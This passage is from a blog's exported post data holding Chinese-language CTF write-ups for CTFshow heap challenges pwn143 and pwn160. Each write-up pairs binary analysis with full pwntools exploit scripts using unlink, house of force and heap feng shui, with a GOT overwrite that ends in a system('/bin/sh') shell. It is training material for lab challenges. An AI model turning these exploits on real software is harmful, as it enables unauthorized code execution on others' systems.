class=\"built_in\">hex</span>(free)))</span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&quot;free&quot;</span>,free)</span><br><span class=\"line\">libcbase=free-libc.dump(<span class=\"string\">&quot;free&quot;</span>)</span><br><span class=\"line\">system=libcbase+libc.dump(<span class=\"string\">&quot;system&quot;</span>)</span><br><span class=\"line\">gdb.attach(io)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x8</span>,p64(system))</span><br><span class=\"line\">delete(<span class=\"number\">3</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"house-of-force\"><a href=\"#house-of-force\" class=\"headerlink\" title=\"house of force\"></a>house of force</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">0</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28197</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,name</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;length:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;name:&quot;</span>)</span><br><span class=\"line\">    io.send(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,size,name</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;index:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;of name:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;name:&quot;</span>)</span><br><span class=\"line\">    io.send(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>():</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">   </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;index:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_flag</span>():</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;5&quot;</span>)</span><br><span class=\"line\">flag=<span class=\"number\">0x400D7F</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">b&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">7</span>+p64(<span class=\"number\">0xffffffffffffffff</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x41</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">offset=-<span class=\"number\">0x70</span></span><br><span class=\"line\">add(offset,<span class=\"string\">b&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,p64(flag)*<span class=\"number\">2</span>)</span><br><span class=\"line\">get_flag()</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>","excerpt":"","more":"<h1 id=\"CTFshow-pwn143-unlink-houce-of-force\"><a href=\"#CTFshow-pwn143-unlink-houce-of-force\" class=\"headerlink\" title=\"CTFshow pwn143 (unlink &amp; houce of force)\"></a>CTFshow pwn143 (unlink &amp; houce of force)</h1><h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"main函数分析\"><a href=\"#main函数分析\" class=\"headerlink\" title=\"main函数分析\"></a>main函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/13/67d2e78e7977a.png\" alt=\"1741875084264.png\"><br>1.经典菜单题<br>2.但是值得注意的是case 5 会调用v4[1] ，可以覆盖其中地址为题目留下的后门函数</p>\n<h3 id=\"add函数分析\"><a href=\"#add函数分析\" class=\"headerlink\" title=\"add函数分析\"></a>add函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/13/67d2e832e7df2.png\" alt=\"1741875249131.png\"><br>1.理清题目堆块指针的保存结构，使用list数组保存对应的堆块大小<br>2.使用heaplist数组，保存堆块的地址</p>\n<h3 id=\"edit函数分析\"><a href=\"#edit函数分析\" class=\"headerlink\" title=\"edit函数分析\"></a>edit函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/13/67d2e8f044392.png\" alt=\"1741875438296.png\"><br>1.发现溢出漏洞，可以溢出多字节</p>\n<h3 id=\"show函数分析\"><a href=\"#show函数分析\" class=\"headerlink\" title=\"show函数分析\"></a>show函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/13/67d2e9e693af7.png\" alt=\"1741875684508.png\"><br>1.没什么特别的，就是可以用来泄露libc</p>\n<h3 id=\"delete函数分析\"><a href=\"#delete函数分析\" class=\"headerlink\" title=\"delete函数分析\"></a>delete函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/13/67d2eab191a39.png\" alt=\"1741875887777.png\"><br>1.没有漏洞，释放后将指针置空了</p>\n<h2 id=\"构造思路\"><a href=\"#构造思路\" class=\"headerlink\" title=\"构造思路\"></a>构造思路</h2><p>1.首先这题在edit时留出了任意长度的溢出，但是没有uaf漏洞。所以这道题首先考虑unlink方法；同时这道题在case5 留出了一个v4给我们操作，那么如果可以通过某种方法申请到这块空间，就可以篡改为题目留下来的后门函数。这里可以使用house of force，也可以考虑fastbin dup吧，后续可以尝试。<br>2.那么确定攻击的方法之后，只需要注意几个点。如果采用unlink的手法，必须注意，伪造的fake_chunk的地址，必须是存放我们进行unlink操作的堆块的地址，如下图中所示。ptr就是存放堆块0的指针<br><img src=\"https://img.picui.cn/free/2025/03/13/67d2ee0282c68.png\" alt=\"1741876735944.png\"><br>3.此题使用unlink还要注意，堆块0的不能大于fastbin的大小，否则最后delete时会报错，不知道为什么。（待解决）明明unlink操作成功，修改free_got也成功，就是会报错。<br>4.如果使用house of force 的手法，那么只需要修改top的size，为-1(0xffffffffffffffff)。然后根据偏移，申清负数大小的堆块，是top_chunk迁移到目的地址(注意留出chunk头大小的空间)，然后申清就可以分配到这块空间。</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"unlink\"><a href=\"#unlink\" class=\"headerlink\" title=\"unlink\"></a>unlink</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">0</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28159</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,name</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;length:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;name:&quot;</span>)</span><br><span class=\"line\">    io.send(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,size,name</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;index:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;of name:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;name:&quot;</span>)</span><br><span class=\"line\">    io.send(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>():</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">   </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;index:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">flag=<span class=\"number\">0x400D7F</span></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>,<span class=\"string\">b&#x27;aaaa&#x27;</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x90</span>,<span class=\"string\">b&#x27;bbbb&#x27;</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">b&#x27;cccc&#x27;</span>) <span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>) <span class=\"comment\">#3</span></span><br><span class=\"line\">ptr=<span class=\"number\">0x6020a8</span></span><br><span class=\"line\">fd=ptr-<span class=\"number\">0x18</span></span><br><span class=\"line\">bk=ptr-<span class=\"number\">0x10</span></span><br><span class=\"line\">fake_chunk=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x61</span>)</span><br><span class=\"line\">fake_chunk+=p64(fd)+p64(bk)</span><br><span class=\"line\">fake_chunk+=p64(<span class=\"number\">0</span>)*<span class=\"number\">8</span></span><br><span class=\"line\">fake_chunk+=p64(<span class=\"number\">0x60</span>)+p64(<span class=\"number\">0xa0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(fake_chunk),fake_chunk)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x90</span>)+p64(elf.got[<span class=\"string\">&#x27;free&#x27;</span>])</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recv(<span class=\"number\">4</span>)</span><br><span class=\"line\">free=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;free-&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(free)))</span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&quot;free&quot;</span>,free)</span><br><span class=\"line\">libcbase=free-libc.dump(<span class=\"string\">&quot;free&quot;</span>)</span><br><span class=\"line\">system=libcbase+libc.dump(<span class=\"string\">&quot;system&quot;</span>)</span><br><span class=\"line\">gdb.attach(io)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x8</span>,p64(system))</span><br><span class=\"line\">delete(<span class=\"number\">3</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"house-of-force\"><a href=\"#house-of-force\" class=\"headerlink\" title=\"house of force\"></a>house of force</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">0</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28197</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,name</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;length:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;name:&quot;</span>)</span><br><span class=\"line\">    io.send(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,size,name</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;index:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;of name:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;name:&quot;</span>)</span><br><span class=\"line\">    io.send(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>():</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">   </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;index:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_flag</span>():</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;5&quot;</span>)</span><br><span class=\"line\">flag=<span class=\"number\">0x400D7F</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">b&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">7</span>+p64(<span class=\"number\">0xffffffffffffffff</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x41</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">offset=-<span class=\"number\">0x70</span></span><br><span class=\"line\">add(offset,<span class=\"string\">b&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,p64(flag)*<span class=\"number\">2</span>)</span><br><span class=\"line\">get_flag()</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>"},{"title":"CTFshow pwn160","_content":"# CTFshow pwn160(堆风水)\n\n## ida分析\n\n### main函数分析\n![1741933551272.png](https://img.picui.cn/free/2025/03/14/67d3cbefdff92.png)\n1.简单的菜单题，通过menu，简单把函数名称修改，做一个简单的逆向\n\n### add函数分析\n![1741933652418.png](https://img.picui.cn/free/2025/03/14/67d3cc54920c5.png)\n1.通过add函数，要对堆块的储存结构有清晰的认知，这会影响甚至是决定我们攻击的手法。\n2.可以看到每次add会申清两个堆块，一个大小由我们控制，一个大小固定为0x80。并且，大小自由的堆块的指针会被保存在，大小固定的那个堆块内。而大小固定的那个堆块的指针会被保存在heaplist(逆向重命名过)上。\n3.input第一个参数是作为指针，所以他会写在v3上，位置是s指针后面。\n4.然后这里调用edit去编辑堆块内容\n\n### edit函数分析\n![1741934774792.png](https://img.picui.cn/free/2025/03/14/67d3d0bb5c4d7.png)\n1.看到这里对输入字节大小的检查，就可以联想到堆风水。是通过堆块的位置加上输入字节的大小，与另一块堆块的地址大小比较来判断。如果这两个堆块之间，有其他堆块，那么我们就可以对中间的堆块为所欲为了。\n\n### show函数分析\n![1741935092305.png](https://img.picui.cn/free/2025/03/14/67d3d1f5186f5.png)\n1.唯一的作用就是泄露libc\n\n### delete函数分析\n![1741935146434.png](https://img.picui.cn/free/2025/03/14/67d3d22ae54bb.png)\n1.没有uaf，不能直接利用\n\n### gdb分析\n![1741934513485.png](https://img.picui.cn/free/2025/03/14/67d3cfb254f83.png)\n1.通过gdb，可以对堆块的内容，结构有更清晰的观察和了解\n\n## 构造思路\n1.首先确定攻击的手法——堆风水.也就是要造成我们申清的堆块在最上方，add自动申清的堆块在最下方。此时我们就可以控制中间的堆块了.而0x80大小，会被放入unsortedbin中，满足先进先出的规则。那么我们先申请几个堆块，小于0x80。free掉堆块0，再add一个0x80大小的堆块，它会在从unsortedbin中取出之前的堆块给我们，同时从topchunk中分配出另一块。至此，一块低地址，一块高地址的堆块构造完成。\n2.第二部对照gdb，把对应位置出的内容修改成free_got就可以通过show泄露libc.然后再通过edit修改got表内容。\n3.最后delete一块内容为`/bin/sh\\x00`的堆块就可以打通了.\n\n## exp\n### 比较复杂的解法\n```python\nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='i386',log_level='debug')\nmode=1\nurl='pwn.challenge.ctf.show'\nport=28252\nelf=ELF(\"./pwn\")\nif mode == 0:\n    io=process(\"./pwn\")\nelse :\n    io=remote(url,port)\n\ndef add(size,name,lenth,content):\n    io.recvuntil(\"Action: \")\n    io.sendline(\"0\")\n    io.recvuntil(\"size of description: \")\n    io.sendline(str(size))\n    io.recvuntil(\"name: \")\n    io.sendline(name)\n    io.recvuntil(\"text length: \")\n    io.sendline(str(lenth))\n    io.recvuntil(\"text: \")\n    io.sendline(content)\n\ndef delete(idx):\n    io.recvuntil(\"Action: \")\n    io.sendline(\"1\")\n    io.recvuntil(\"\")\n    io.sendline(str(idx))\n\ndef show(idx):\n    io.recvuntil(\"Action: \")\n    io.sendline(\"2\")\n    io.recvuntil(\"\")\n    io.sendline(str(idx))\n\ndef edit(idx,lenth,content):\n    io.recvuntil(\"Action: \")\n    io.sendline(\"3\")\n    io.recvuntil(\"index: \")\n    io.sendline(str(idx))\n    io.recvuntil(\"text length: \")\n    io.sendline(str(lenth))\n    io.recvuntil(\"text: \")\n    io.sendline(content)\n\nadd(0x10,b\"a\",0x8,b'hhhh')  #0\nadd(0x20,b\"b\",0x8,b'hhhh')  #1\nadd(0x20,b\"c\",0x8,b'hhhh')  #2\nadd(0x20,b\"d\",0x10,b'/bin/sh\\x00')  #3\ndelete(2)  \ndelete(0)\n\nadd(0x10,b\"d\",0x40,b'aaaa') #4\nadd(0x80,b'e',0x8,b'bbbb')  #5\nfree_got=elf.got['free']\npayload=p32(0)*5+p32(0x89)\npayload+=p32(0)*16\npayload+=p32(0x88)+p32(0x28)\npayload+=p32(0)*9+p32(0x89)\npayload+=p32(0)*4\npayload+=p32(0x88)+p64(0x29)\npayload+=p32(0)*8+p32(0x89)\npayload+=p32(free_got)\nedit(4,len(payload),payload)\nshow(1)\nio.recvuntil(\"description: \")\nfree=u32(io.recv(4))\nlog.success('free-{}'.format(hex(free)))\n#gdb.attach(io)\nlibc=LibcSearcher(\"free\",free)\nlibcbase=free-libc.dump('free')\nsystem=libcbase+libc.dump('system')\nedit(1,0x4,p32(system))\n#gdb.attach(io)\ndelete(3)\nio.interactive()\n```\n现在看来，delete(2)似乎有点多余了","source":"_posts/heap/CTFshow pwn160.md","raw":"---\ntitle: CTFshow pwn160\n---\n# CTFshow pwn160(堆风水)\n\n## ida分析\n\n### main函数分析\n![1741933551272.png](https://img.picui.cn/free/2025/03/14/67d3cbefdff92.png)\n1.简单的菜单题，通过menu，简单把函数名称修改，做一个简单的逆向\n\n### 